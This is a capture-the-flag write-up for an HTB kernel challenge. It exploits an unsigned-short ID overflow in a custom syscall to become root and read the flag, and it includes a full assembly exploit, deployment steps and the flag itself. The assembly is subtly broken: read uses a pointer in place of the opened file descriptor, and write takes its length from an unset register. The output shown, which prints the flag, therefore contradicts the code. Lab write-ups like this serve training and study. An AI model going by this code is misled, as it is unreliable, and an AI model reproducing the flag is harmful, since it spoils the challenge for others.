---
title: "Kernel Adventures Part 2"
ctf: "HTB Pro Labs"
date: 2026-06-16
category: pwn
difficulty: medium
flag_format: "HTB{...}"
---

# Kernel Adventures Part 2

## Summary

Custom Linux kernel syscall 449 implements a userspace-like authentication system. A recursive delete in `do_delete()` leaves dangling pointers in the global `magic_users[]` array, but the simpler exploit path is an `unsigned short nextId` overflow: after 65535 user creations, `nextId` wraps to 0, giving the next created user uid=0.

## Solution

### Step 1: Identify the vulnerability

The `magic.c` kernel module (syscall 449) manages users with a `static unsigned short nextId` field. Each `do_add()` sets `newUser->uid.val = nextId` then increments `nextId`. Since `nextId` is an unsigned 16-bit integer, it wraps to 0 after 65535 increments. A user with uid=0 can be created, then switched to (as a child, no password needed via the child-switch path), granting root privileges.

### Step 2: Exploit

The exploit is a minimal x86-64 assembly program that:
1. Calls `MAGIC_ADD("x","p")` + `MAGIC_DELETE("x")` 65534 times to overflow `nextId` to 0
2. Calls `MAGIC_ADD("r","p")` — "r" gets uid=0
3. Calls `MAGIC_SWITCH("r", NULL)` — "r" is our child, so no password needed
4. Opens `/flag.txt` and writes it to stdout

```asm
.globl _start
_start:
    lea username(%rip), %r12
    lea password(%rip), %r13
    mov $65534, %ebx
loop:
    mov $449, %eax
    xor %edi, %edi
    mov %r12, %rsi
    mov %r13, %rdx
    syscall
    mov $449, %eax
    mov $2, %edi
    mov %r12, %rsi
    xor %edx, %edx
    syscall
    dec %ebx
    jnz loop
    mov $449, %eax
    xor %edi, %edi
    lea rootuser(%rip), %rsi
    mov %r13, %rdx
    syscall
    mov $449, %eax
    mov $3, %edi
    lea rootuser(%rip), %rsi
    xor %edx, %edx
    syscall
    mov $2, %eax
    lea flagpath(%rip), %rdi
    xor %esi, %esi
    syscall
    mov %eax, %r14d
    xor %eax, %eax
    lea buf(%rip), %rsi
    mov $255, %edx
    syscall
    mov $1, %eax
    mov $1, %edi
    lea buf(%rip), %rsi
    mov %r15d, %edx
    syscall
    mov $60, %eax
    xor %edi, %edi
    syscall
.section .rodata
username: .asciz "x"
.space 63
password: .asciz "p"
.space 63
rootuser: .asciz "r"
.space 63
flagpath: .asciz "/flag.txt"
.bss
buf: .space 256
```

### Step 3: Deploy

- Compile: `as -o exploit.o exploit.S && ld -o exploit exploit.o && strip exploit`
- Base64-encode and upload chunks via serial console (9600 baud, 32 chunks)
- Decode with `base64 -d`, `chmod +x`, and run

```
$ /home/user/exp
HTB{D0n7_f0rg3t_t0_ch3ck_th3_51gn5!}
```

## Flag

```
HTB{D0n7_f0rg3t_t0_ch3ck_th3_51gn5!}
```
